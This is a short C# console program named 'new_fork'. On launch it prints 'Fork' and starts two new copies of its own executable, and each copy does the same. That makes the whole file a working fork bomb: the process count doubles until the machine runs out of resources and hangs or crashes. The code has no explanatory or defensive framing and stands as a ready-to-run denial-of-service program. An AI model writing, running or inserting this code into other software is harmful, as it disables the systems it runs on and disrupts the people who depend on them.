using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace new_fork
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Fork");
            
            
            String name = System.Reflection.Assembly.GetExecutingAssembly().Location;
            System.Diagnostics.Process.Start(name);
            System.Diagnostics.Process.Start(name);
            Console.Read();

        }
    }
}
